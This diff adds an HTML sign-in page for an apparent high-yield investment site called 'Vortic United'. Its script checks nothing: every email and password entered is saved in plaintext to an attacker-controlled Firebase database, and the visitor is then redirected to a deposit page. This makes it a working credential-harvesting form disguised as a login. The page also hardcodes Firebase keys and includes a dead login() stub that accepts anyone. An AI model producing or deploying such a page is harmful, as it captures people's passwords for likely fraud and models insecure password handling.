@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Vortic United</title>
+<link href="css/style.css" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+</head>
+
+<body onload="checkLoggedInStatus()">
+
+<div id="root">
+   <div class="styles_loginPage__-V1JN">
+      <div class="styles_loginPage_wrapper__7+VSd"  style="background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url(img/bg.png) no-repeat 50%;background-size: cover;">
+         <div class="styles_block__fSsYB" >
+            <div class="styles_welcome__PtIvY">
+               <img src="img/logo.svg" alt="" width="168" height="37">
+               <p class="styles_block_title__xdB3N">Welcome to vortic united!</p>
+               <p class="styles_block_subtitle__V78ds">We are glad to see you again! Get access to your account</p>
+            </div>
+            <div class="styles_form__ZQh+h">
+               <p class="styles_login__baj25">Sign In to Vortic United</p>
+               <div class="styles_login_tab__xQzfn">
+                 
+  
+
+
+
+   <form id="loginForm" class="verify-gcaptcha" method="POST" action="login.html" autocomplete="off">
+ <input type="hidden" name="active" value="yes">
+
+    <div class="styles_inputs__5EnOM">
+        <div class="styles_inputWrapper__3gbYf">
+            <input class="styles_input__U-ion" name="username" placeholder="Email" type="email" value="" style="height: 59px;">
+        </div>
+        <div class="styles_inputWrapper__3gbYf">
+            <input class="styles_input__U-ion" name="password" placeholder="Password" type="password" value="" style="height: 59px;">
+        </div>
+    </div>
+    <p class="styles_forgot__u+I-d">Forgot password?</p>
+    <button class="style_button__VB+kt style_button_red__QTb4B" style="max-width: 488px; height: 48px;" type="submit" >Sign in</button>
+    <p class="styles_noAccount__mJphx">Don't have an account?</p>
+    <p class="styles_signUp__6QW8F" onclick="window.location.href='register.html'">Sign Up</p>
+</form>
+
+
+
+
+
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyAnRNSqRCMrSjhV1h74l8x57BnHIdoIiGY",
+    authDomain: "hyip-html-websites.firebaseapp.com",
+    databaseURL: "https://hyip-html-websites-default-rtdb.firebaseio.com",
+    projectId: "hyip-html-websites",
+    storageBucket: "hyip-html-websites.appspot.com",
+    messagingSenderId: "241224051127",
+    appId: "1:241224051127:web:213fd8f4002bdd3fdc6032",
+    measurementId: "G-QLBNBX70XP"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  
+  var database = firebase.database();
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+    var active = document.getElementsByName('active')[0].value;
+
+    // validate fields
+    if(username.trim() === '' || password.trim() === '') {
+      alert('All fields are required');
+      return;
+    }
+
+    // add data to firebase
+    var newUserRef = database.ref('vorticUnited_users').push();
+    newUserRef.set({
+      username: username,
+      password: password, // note: you should never store passwords in plaintext
+      active: active,
+      timeAdded: firebase.database.ServerValue.TIMESTAMP
+    }, function(error) {
+      if (error) {
+        console.error('Error writing data: ', error);
+      } else {
+        console.log('Data successfully written!');
+
+        // save data to the session
+        sessionStorage.setItem('username', username);
+        sessionStorage.setItem('password', password);
+
+        // redirect to the desired page
+        window.location.href = 'dashboard/deposit.html';
+      }
+    });
+  });
+</script>
+
+
+
+
+<script>
+    function checkLoggedInStatus() {
+  if(localStorage.getItem('loggedIn') === 'true') {
+    window.location.href = 'dashboard/deposit.html';
+  }
+}
+
+function login() {
+  var email = document.getElementsByName('email')[0].value;
+  var password = document.getElementsByName('password')[0].value;
+  
+  // Here you would call your backend service to check the username/password
+  // As we do not have backend, we will assume if username and password both are 'admin', it's a valid user
+
+    localStorage.setItem('loggedIn', true);
+    window.location.href = 'dashbord.html';
+
+}
+
+</script>
+
+
+               </div>
+            </div>
+         </div>
+      </div>
+   </div>
+   <div class="Toastify"></div>
+</div>
+
+</body>
+</html>
